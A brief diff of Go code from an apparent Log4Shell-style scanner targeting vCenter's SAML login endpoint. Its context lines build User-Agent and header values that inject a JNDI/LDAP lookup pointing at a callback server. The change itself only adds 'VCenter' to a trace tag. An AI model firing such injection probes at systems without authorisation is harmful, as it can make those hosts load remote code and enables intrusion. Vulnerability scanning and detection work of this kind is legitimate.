@@ -111,7 +111,7 @@ func ScanIPLDAPUi(Url string, serverUrl string, payload string, client *http.Cli
                 if len(redirectUrl) > 0  {
                         newUrl, _ := url.Parse(redirectUrl)
                         newTargetUrl := newUrl.Scheme + "://" + newUrl.Host + newUrl.Path + "?" + "SAMLRequest="
-                        traceHint := fmt.Sprintf("%s_%s", baseUrl.Hostname(), baseUrl.Port())
+                        traceHint := fmt.Sprintf("%s_%s_%s", baseUrl.Hostname(), baseUrl.Port(), "VCenter")
                         targetUserAgent := payload + serverUrl+ "/" + traceHint + "_User-Agent" + "}"
                         targetHeader := payload + serverUrl+ "/" + traceHint + "}"
                         newRequest, err := http.NewRequest("GET", newTargetUrl, nil)
